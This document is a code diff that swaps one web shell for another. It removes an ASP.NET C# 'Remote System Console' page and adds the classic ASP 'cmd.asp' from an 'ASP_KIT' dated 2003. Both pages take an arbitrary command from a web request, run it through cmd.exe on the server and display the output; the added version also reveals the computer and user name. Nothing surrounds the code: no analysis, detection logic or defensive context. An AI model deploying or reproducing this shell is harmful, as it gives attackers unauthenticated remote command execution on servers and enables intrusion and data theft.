@@ -1,67 +1,46 @@
-<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>System Console</title>
-    <style>
-        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
-        .output { background: #252526; border: 1px solid #3e3e42; padding: 15px; margin: 10px 0; white-space: pre-wrap; min-height: 100px; }
-        input[type="text"] { width: 70%; padding: 8px; background: #3c3c3c; color: #fff; border: 1px solid #555; }
-        input[type="submit"] { padding: 8px 20px; background: #0e639c; color: #fff; border: none; cursor: pointer; }
-        .header { color: #4fc1ff; margin-bottom: 20px; font-size: 18px; }
-        .prompt { color: #ce9178; margin-top: 15px; }
-    </style>
-</head>
-<body>
-    <div class="header">=== Remote System Console ===</div>
-    
-    <form method="post" runat="server">
-        <asp:TextBox ID="cmdInput" runat="server" Width="70%" placeholder="Enter command (e.g., whoami, dir, ipconfig)" />
-        <asp:Button ID="executeBtn" runat="server" Text="Execute" OnClick="ExecuteCommand" />
-    </form>
+<!--
 
-    <asp:Panel ID="resultPanel" runat="server" Visible="false">
-        <div class="prompt">$ <asp:Label ID="cmdLabel" runat="server" /></div>
-        <div class="output"><asp:Label ID="outputLabel" runat="server" /></div>
-    </asp:Panel>
+ASP_KIT
 
-    <script runat="server">
-        protected void ExecuteCommand(object sender, EventArgs e)
-        {
-            string cmd = cmdInput.Text;
-            if (!string.IsNullOrEmpty(cmd))
-            {
-                cmdLabel.Text = Server.HtmlEncode(cmd);
-                
-                try
-                {
-                    Process p = new Process();
-                    p.StartInfo.FileName = "cmd.exe";
-                    p.StartInfo.Arguments = "/c " + cmd;
-                    p.StartInfo.RedirectStandardOutput = true;
-                    p.StartInfo.RedirectStandardError = true;
-                    p.StartInfo.UseShellExecute = false;
-                    p.StartInfo.CreateNoWindow = true;
-                    p.Start();
-                    
-                    string output = p.StandardOutput.ReadToEnd();
-                    string error = p.StandardError.ReadToEnd();
-                    p.WaitForExit();
-                    
-                    string result = string.IsNullOrEmpty(output) ? error : output;
-                    if (string.IsNullOrEmpty(result)) result = "[No output]";
-                    
-                    outputLabel.Text = Server.HtmlEncode(result).Replace("\n", "<br/>");
-                    resultPanel.Visible = true;
-                }
-                catch (Exception ex)
-                {
-                    outputLabel.Text = "Error: " + Server.HtmlEncode(ex.Message);
-                    resultPanel.Visible = true;
-                }
-            }
-        }
-    </script>
-</body>
-</html>
+cmd.asp = Command Execution
+
+by: Maceo
+modified: 25/06/2003
+
+-->
+
+<%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+szCMD = request("cmd")
+
+If (szCMD <> "") Then
+  szTempFile = "C:\" & oFileSys.GetTempName( )
+  Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+  Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
+  End If
+%>
+
+<HTML>
+<BODY>
+<FORM action="" method="GET">
+<input type="text" name="cmd" size=45 value="<%= szCMD %>">
+<input type="submit" value="Run">
+</FORM>
+<PRE>
+<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<br>
+<%
+  If (IsObject(oFile)) Then
+    On Error Resume Next
+    Response.Write Server.HTMLEncode(oFile.ReadAll)
+    oFile.Close
+    Call oFileSys.DeleteFile(szTempFile, True)
+  End If
+%>
+</BODY>
+</HTML>
+
+
